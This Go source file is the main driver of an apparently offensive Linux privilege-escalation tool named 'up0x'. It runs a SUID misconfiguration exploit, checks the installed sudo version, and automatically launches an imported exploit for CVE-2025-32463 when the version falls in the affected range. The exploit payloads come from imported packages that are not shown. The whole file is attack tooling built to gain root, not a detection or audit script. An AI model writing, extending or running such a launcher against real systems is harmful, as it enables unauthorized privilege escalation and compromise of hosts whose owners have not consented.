package main

import (
	"fmt"
	"os/exec"
	"regexp"
	"up0x/payload/exploits/misconfig/SUID"
	"up0x/payload/exploits/third_parts/sudo/CVE-2025-32463"
	versionutil "up0x/util"
)

type ExploitInterface interface {
	Run()
}
type Vuln struct {
	Name        string
	MinVer      string // 影响区间下限
	MaxVer      string // 影响区间上限
	ExploitFunc ExploitInterface
}

//TIP <p>To run your code, right-click the code and select <b>Run</b>.</p> <p>Alternatively, click
// the <icon src="AllIcons.Actions.Execute"/> icon in the gutter and select the <b>Run</b> menu item from here.</p>

func main() {
	blue := "\033[34m"
	reset := "\033[0m"
	art := `
    ██    ██ ██████   ██████  ██   ██ 
    ██    ██ ██   ██ ██  ████  ██ ██   
    ██    ██ ██████  ██ ██ ██   ███   
    ██    ██ ██      ████  ██  ██ ██  
     ██████  ██       ██████  ██   ██ 
	  author: g0ubu1i
`
	fmt.Print(blue + art + reset)
	fmt.Println("[+] up0x start work")
	fmt.Println("[+] check SUID ...")
	exploit := &SUID.Exploit{}
	exploit.Run()
	fmt.Println("[+] check Sudo version")
	cmd := exec.Command("sudo", "--version")
	output, err := cmd.CombinedOutput()
	var sudoVersion string
	if err != nil {
		fmt.Println("[-] check Sudo version failed")
	} else {
		re := regexp.MustCompile(`Sudo version\s+([0-9]+(\.[0-9]+)+[a-zA-Z0-9]*)`)
		match := re.FindStringSubmatch(string(output))
		if match != nil {
			sudoVersion = match[1]
			fmt.Println("[+] Sudo version:", sudoVersion)
		}
	}
	sudo_vulns := []Vuln{
		{"CVE-2025-32463", "1.9.14", "1.9.17", &CVE_2025_32463.Exploit{}},
	}
	for _, v := range sudo_vulns {
		if versionutil.VersionInRange(sudoVersion, v.MinVer, v.MaxVer) {
			fmt.Println("[+]", v.Name, "vulnerability found")
			v.ExploitFunc.Run()
		}
	}
}
